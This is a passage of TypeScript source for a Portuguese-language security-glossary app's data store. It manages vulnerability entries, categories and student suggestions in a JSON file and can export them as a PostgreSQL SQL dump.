        const raw = fs.readFileSync(DATA_FILE, 'utf-8');
        return JSON.parse(raw);
      }
    } catch (err) {
      console.error('Erro ao ler arquivo de dados local, usando estado inicial:', err);
    }

    const defaultState: DatabaseState = {
      categories: INITIAL_CATEGORIES,
      vulnerabilities: INITIAL_VULNERABILITIES,
      suggestions: INITIAL_SUGGESTIONS,
    };

    this.saveState(defaultState);
    return defaultState;
  }

  private saveState(stateToSave = this.state): void {
    try {
      if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
      }
      fs.writeFileSync(DATA_FILE, JSON.stringify(stateToSave, null, 2), 'utf-8');
    } catch (err) {
      console.error('Erro ao salvar dados no disco:', err);
    }
  }

  // Categories
  getCategories(): Category[] {
    return [...this.state.categories].sort((a, b) => a.sort_order - b.sort_order);
  }

  // Vulnerabilities
  getVulnerabilities(query?: string, categoryId?: string, severity?: string): Vulnerability[] {
    let result = [...this.state.vulnerabilities];

    if (categoryId && categoryId !== 'all') {
      result = result.filter(v => v.category_id === categoryId);
    }

    if (severity && severity !== 'all') {
      result = result.filter(v => v.severity.toLowerCase() === severity.toLowerCase());
    }

    if (query && query.trim() !== '') {
      const q = query.toLowerCase().trim();
      result = result.filter(
        v =>
          v.title.toLowerCase().includes(q) ||
          v.short_summary.toLowerCase().includes(q) ||
          v.detailed_description.toLowerCase().includes(q) ||
          (v.cwe_id && v.cwe_id.toLowerCase().includes(q)) ||
          (v.owasp_reference && v.owasp_reference.toLowerCase().includes(q))
      );
    }

    return result.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }

  getVulnerabilityById(id: string): Vulnerability | undefined {
    return this.state.vulnerabilities.find(v => v.id === id);
  }

  createVulnerability(data: Omit<Vulnerability, 'id' | 'created_at' | 'updated_at'>): Vulnerability {
    const newVuln: Vulnerability = {
      ...data,
      id: `vuln-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      created_at: new Date().toISOString(),
      updated_at: new Date().toISOString(),
    };
    this.state.vulnerabilities.unshift(newVuln);
    this.saveState();
    return newVuln;
  }

  updateVulnerability(id: string, data: Partial<Omit<Vulnerability, 'id' | 'created_at'>>): Vulnerability | null {
    const idx = this.state.vulnerabilities.findIndex(v => v.id === id);
    if (idx === -1) return null;

    const updated: Vulnerability = {
      ...this.state.vulnerabilities[idx],
      ...data,
      updated_at: new Date().toISOString(),
    };

    this.state.vulnerabilities[idx] = updated;
    this.saveState();
    return updated;
  }

  deleteVulnerability(id: string): boolean {
    const initialLen = this.state.vulnerabilities.length;
    this.state.vulnerabilities = this.state.vulnerabilities.filter(v => v.id !== id);
    const deleted = this.state.vulnerabilities.length < initialLen;
    if (deleted) {
      this.saveState();
    }
    return deleted;
  }

  // Suggestions
  getSuggestions(status?: string): Suggestion[] {
    let result = [...this.state.suggestions];
    if (status && status !== 'all') {
      result = result.filter(s => s.status === status);
    }
    return result.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }

  createSuggestion(data: Omit<Suggestion, 'id' | 'status' | 'created_at'>): Suggestion {
    const newSug: Suggestion = {
      ...data,
      id: `sug-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`,
      status: 'pending',
      created_at: new Date().toISOString(),
    };
    this.state.suggestions.unshift(newSug);
    this.saveState();
    return newSug;
  }

  updateSuggestionStatus(id: string, status: 'pending' | 'approved' | 'rejected', adminNotes?: string): Suggestion | null {
    const idx = this.state.suggestions.findIndex(s => s.id === id);
    if (idx === -1) return null;

    this.state.suggestions[idx].status = status;
    if (adminNotes !== undefined) {
      this.state.suggestions[idx].admin_notes = adminNotes;
    }

    this.saveState();
    return this.state.suggestions[idx];
  }

  convertSuggestionToVulnerability(suggestionId: string, overrides?: Partial<Vulnerability>): Vulnerability | null {
    const suggestion = this.state.suggestions.find(s => s.id === suggestionId);
    if (!suggestion) return null;

    const newVuln = this.createVulnerability({
      title: overrides?.title || suggestion.term_title,
      category_id: overrides?.category_id || suggestion.category_id || 'owasp-top10',
      severity: overrides?.severity || suggestion.severity || 'Medium',
      short_summary: overrides?.short_summary || suggestion.description.slice(0, 150),
      detailed_description: overrides?.detailed_description || suggestion.description,
      practical_example: overrides?.practical_example || suggestion.example || 'Exemplo a ser complementado pelo administrador.',
      mitigation: overrides?.mitigation || 'Práticas de mitigação recomendadas pela equipe de segurança.',
      cwe_id: overrides?.cwe_id || 'CWE-Unknown',
      owasp_reference: overrides?.owasp_reference || 'Comunidade Security X',
      attack_vector: overrides?.attack_vector || 'Aplicação Web / Rede',
      impact_scope: overrides?.impact_scope || 'Integridade e Confidencialidade',
    });

    this.updateSuggestionStatus(suggestionId, 'approved', 'Convertido para termo oficial do glossário.');
    return newVuln;
  }

  // Export full PostgreSQL SQL dump
  generatePostgresDump(): string {
    const escapeSql = (str: string) => (str ? str.replace(/'/g, "''") : '');

    let sql = `-- ====================================================================
-- Security X - Dump Completo Exportável para PostgreSQL
-- Gerado em: ${new Date().toISOString()}
-- ====================================================================

-- 1. Criação das Tabelas
CREATE TABLE IF NOT EXISTS categories (
    id VARCHAR(50) PRIMARY KEY,
    name VARCHAR(100) NOT NULL,
    description TEXT,
    badge_label VARCHAR(50),
    sort_order INT DEFAULT 0
);

CREATE TABLE IF NOT EXISTS vulnerabilities (
    id VARCHAR(50) PRIMARY KEY,
    title VARCHAR(150) NOT NULL,
    category_id VARCHAR(50) REFERENCES categories(id) ON DELETE SET NULL,
    severity VARCHAR(20) NOT NULL CHECK (severity IN ('Low', 'Medium', 'High', 'Critical')),
    short_summary TEXT NOT NULL,
    detailed_description TEXT NOT NULL,
    practical_example TEXT NOT NULL,
    mitigation TEXT NOT NULL,
    cwe_id VARCHAR(50),
    owasp_reference VARCHAR(100),
    attack_vector VARCHAR(100),
    impact_scope VARCHAR(150),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS suggestions (
    id VARCHAR(50) PRIMARY KEY,
    term_title VARCHAR(150) NOT NULL,
    category_id VARCHAR(50) REFERENCES categories(id) ON DELETE SET NULL,
    severity VARCHAR(20) DEFAULT 'Medium' CHECK (severity IN ('Low', 'Medium', 'High', 'Critical')),
    description TEXT NOT NULL,
    example TEXT,
    student_name VARCHAR(100),
    student_email VARCHAR(100),
    status VARCHAR(20) DEFAULT 'pending' CHECK (status IN ('pending', 'approved', 'rejected')),
    admin_notes TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- 2. Inserção de Categorias
`;

    for (const cat of this.state.categories) {
      sql += `INSERT INTO categories (id, name, description, badge_label, sort_order) VALUES ('${escapeSql(cat.id)}', '${escapeSql(cat.name)}', '${escapeSql(cat.description)}', '${escapeSql(cat.badge_label)}', ${cat.sort_order}) ON CONFLICT (id) DO UPDATE SET name = EXCLUDED.name;\n`;
    }

    sql += '\n-- 3. Inserção de Vulnerabilidades\n';
    for (const v of this.state.vulnerabilities) {
      sql += `INSERT INTO vulnerabilities (id, title, category_id, severity, short_summary, detailed_description, practical_example, mitigation, cwe_id, owasp_reference, attack_vector, impact_scope, created_at, updated_at) VALUES ('${escapeSql(v.id)}', '${escapeSql(v.title)}', '${escapeSql(v.category_id)}', '${escapeSql(v.severity)}', '${escapeSql(v.short_summary)}', '${escapeSql(v.detailed_description)}', '${escapeSql(v.practical_example)}', '${escapeSql(v.mitigation)}', '${escapeSql(v.cwe_id)}', '${escapeSql(v.owasp_reference)}', '${escapeSql(v.attack_vector)}', '${escapeSql(v.impact_scope)}', '${v.created_at}', '${v.updated_at}') ON CONFLICT (id) DO NOTHING;\n`;
    }

    sql += '\n-- 4. Inserção de Sugestões\n';
    for (const s of this.state.suggestions) {
      sql += `INSERT INTO suggestions (id, term_title, category_id, severity, description, example, student_name, student_email, status, admin_notes, created_at) VALUES ('${escapeSql(s.id)}', '${escapeSql(s.term_title)}', '${escapeSql(s.category_id)}', '${escapeSql(s.severity)}', '${escapeSql(s.description)}', '${escapeSql(s.example)}', '${escapeSql(s.student_name)}', '${escapeSql(s.student_email)}', '${escapeSql(s.status)}', '${escapeSql(s.admin_notes || '')}', '${s.created_at}') ON CONFLICT (id) DO NOTHING;\n`;
    }

    return sql;
  }
}

export const securityStore = new SecurityStore();
